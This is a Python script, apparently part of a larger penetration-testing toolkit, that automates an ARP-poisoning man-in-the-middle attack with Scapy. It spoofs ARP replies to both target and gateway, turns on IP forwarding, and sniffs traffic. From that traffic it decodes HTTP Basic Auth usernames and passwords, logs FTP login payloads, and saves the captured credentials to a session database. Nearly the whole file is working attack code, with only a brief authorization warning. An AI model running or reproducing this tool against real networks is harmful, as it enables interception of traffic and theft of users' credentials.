#!/usr/bin/env python3
"""
ARP Poisoning Suite - Man-in-the-Middle Attack Automation

Implements targeted ARP spoofing for credential interception and network manipulation.
Integrates with Scapy for packet crafting and analysis.

WARNING: This tool performs active network attacks. Use only with explicit authorization.
"""

import sys
import os
import argparse
import time
import threading
from datetime import datetime

# Scapy imports
try:
    from scapy.all import ARP, Ether, sendp, sniff, get_if_hwaddr, conf
    from scapy.layers.inet import IP, TCP
    from scapy.layers.http import HTTP, HTTPRequest
except ImportError:
    print("Error: Scapy not installed. Install with: pip3 install scapy")
    sys.exit(1)

# Add parent directory to path for imports
sys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), '../..')))

from core.database import DatabaseManager
from core.logger import setup_logger, get_logger

logger = None

class ARPPoisoner:
    """ARP spoofing attack coordinator"""
    
    def __init__(self, target_ip, gateway_ip, interface='eth0'):
        self.target_ip = target_ip
        self.gateway_ip = gateway_ip
        self.interface = interface
        self.poisoning = False
        self.our_mac = get_if_hwaddr(interface)
        
        logger.info(f"Initialized ARP Poisoner: {target_ip} <-> {gateway_ip}")
    
    def get_mac(self, ip):
        """Get MAC address for IP via ARP request"""
        from scapy.all import srp
        
        arp_request = ARP(pdst=ip)
        broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
        arp_request_broadcast = broadcast / arp_request
        
        answered_list = srp(arp_request_broadcast, timeout=2, verbose=False)[0]
        
        if answered_list:
            return answered_list[0][1].hwsrc
        return None
    
    def spoof(self, target_ip, spoof_ip, target_mac):
        """Send ARP packet to poison target's cache"""
        packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip, hwsrc=self.our_mac)
        sendp(Ether(dst=target_mac)/packet, verbose=False, iface=self.interface)
    
    def restore(self, destination_ip, source_ip, destination_mac, source_mac):
        """Restore ARP tables to original state"""
        packet = ARP(op=2, pdst=destination_ip, hwdst=destination_mac, 
                    psrc=source_ip, hwsrc=source_mac)
        sendp(Ether(dst=destination_mac)/packet, count=4, verbose=False, iface=self.interface)
    
    def poison_loop(self, target_mac, gateway_mac):
        """Continuously send spoofed ARP packets"""
        logger.info("Starting ARP poisoning attack...")
        self.poisoning = True
        
        while self.poisoning:
            # Poison target (tell target we are the gateway)
            self.spoof(self.target_ip, self.gateway_ip, target_mac)
            
            # Poison gateway (tell gateway we are the target)
            self.spoof(self.gateway_ip, self.target_ip, gateway_mac)
            
            time.sleep(2)  # Send every 2 seconds
    
    def start(self):
        """Start ARP poisoning attack"""
        # Get MAC addresses
        target_mac = self.get_mac(self.target_ip)
        gateway_mac = self.get_mac(self.gateway_ip)
        
        if not target_mac or not gateway_mac:
            logger.error("Failed to resolve MAC addresses")
            return False
        
        logger.info(f"Target MAC: {target_mac}, Gateway MAC: {gateway_mac}")
        
        # Enable IP forwarding (required for MITM)
        os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
        logger.info("Enabled IP forwarding")
        
        # Start poisoning in background thread
        poison_thread = threading.Thread(
            target=self.poison_loop,
            args=(target_mac, gateway_mac)
        )
        poison_thread.daemon = True
        poison_thread.start()
        
        return True
    
    def stop(self, target_mac, gateway_mac):
        """Stop ARP poisoning and restore ARP tables"""
        logger.info("Stopping ARP poisoning...")
        self.poisoning = False
        
        # Restore ARP tables
        self.restore(self.target_ip, self.gateway_ip, target_mac, gateway_mac)
        self.restore(self.gateway_ip, self.target_ip, gateway_mac, target_mac)
        
        # Disable IP forwarding
        os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
        logger.info("ARP poisoning stopped and tables restored")


class PacketSniffer:
    """Packet capture and credential extraction"""
    
    def __init__(self, interface='eth0'):
        self.interface = interface
        self.captured_creds = []
    
    def process_packet(self, packet):
        """Process captured packets for credentials"""
        try:
            # HTTP Credentials
            if packet.haslayer(HTTPRequest):
                http_layer = packet[HTTPRequest]
                ip_src = packet[IP].src if packet.haslayer(IP) else "Unknown"
                
                # Check for Basic Auth
                if http_layer.Authorization:
                    auth_header = http_layer.Authorization.decode()
                    if 'Basic' in auth_header:
                        import base64
                        encoded_creds = auth_header.split('Basic ')[1]
                        try:
                            decoded = base64.b64decode(encoded_creds).decode()
                            username, password = decoded.split(':')
                            
                            cred = {
                                'source': 'HTTP_Basic_Auth',
                                'username': username,
                                'password': password,
                                'ip': ip_src,
                                'timestamp': datetime.now().isoformat()
                            }
                            self.captured_creds.append(cred)
                            logger.info(f"Captured HTTP Basic Auth: {username}@{ip_src}")
                        except:
                            pass
            
            # FTP Credentials
            if packet.haslayer(TCP) and packet.haslayer('Raw'):
                payload = str(packet['Raw'].load)
                
                if 'USER ' in payload or 'PASS ' in payload:
                    ip_src = packet[IP].src if packet.haslayer(IP) else "Unknown"
                    logger.info(f"FTP authentication attempt from {ip_src}")
                    logger.info(f"  Payload: {payload[:100]}")
        
        except Exception as e:
            logger.debug(f"Error processing packet: {e}")
    
    def start_sniffing(self, duration=60):
        """Start packet capture"""
        logger.info(f"Starting packet capture on {self.interface} for {duration}s...")
        
        # Sniff packets
        packets = sniff(
            iface=self.interface,
            prn=self.process_packet,
            timeout=duration,
            store=False
        )
        
        logger.info(f"Captured {len(self.captured_creds)} credentials")
        return self.captured_creds


def main(session_dir, target_ip, gateway_ip, duration=120):
    """Main MITM attack flow"""
    global logger
    
    # Setup logging
    setup_logger("arp_poisoning", session_dir)
    logger = get_logger("arp_poisoning")
    
    logger.info("=" * 60)
    logger.info("ARP Poisoning Suite - MITM Attack")
    logger.info("=" * 60)
    logger.warning("WARNING: Active network attack in progress")
    logger.info(f"Target: {target_ip} | Gateway: {gateway_ip}")
    
    # Initialize components
    poisoner = ARPPoisoner(target_ip, gateway_ip)
    sniffer = PacketSniffer()
    
    # Start ARP poisoning
    if not poisoner.start():
        logger.error("Failed to start ARP poisoning")
        return
    
    try:
        # Capture traffic
        logger.info(f"Capturing traffic for {duration} seconds...")
        credentials = sniffer.start_sniffing(duration=duration)
        
        # Save credentials to database
        if credentials:
            db_path = os.path.join(session_dir, "session.db")
            db = DatabaseManager(db_path)
            
            for cred in credentials:
                db.add_credential(
                    username=cred['username'],
                    domain="N/A",
                    password=cred['password'],
                    source=cred['source']
                )
                logger.info(f"Saved credential: {cred['username']}")
            
            logger.info(f"Total credentials captured: {len(credentials)}")
        else:
            logger.info("No credentials captured during MITM")
    
    finally:
        # Cleanup
        target_mac = poisoner.get_mac(target_ip)
        gateway_mac = poisoner.get_mac(gateway_ip)
        
        if target_mac and gateway_mac:
            poisoner.stop(target_mac, gateway_mac)


if __name__ == "__main__":
    parser = argparse.ArgumentParser(
        description="ARP Poisoning MITM Suite - Credential Interception"
    )
    parser.add_argument("--session-dir", required=True, help="Session directory")
    parser.add_argument("--target-ip", required=True, help="Target IP address")
    parser.add_argument("--gateway-ip", required=True, help="Gateway IP address")
    parser.add_argument("--duration", type=int, default=120, help="Capture duration (seconds)")
    parser.add_argument("--interface", default="eth0", help="Network interface")
    
    args = parser.parse_args()
    
    # Check for root privileges
    if os.geteuid() != 0:
        print("Error: This script requires root privileges")
        print("Run with: sudo python3 arp_poisoning_suite.py ...")
        sys.exit(1)
    
    main(args.session_dir, args.target_ip, args.gateway_ip, args.duration)
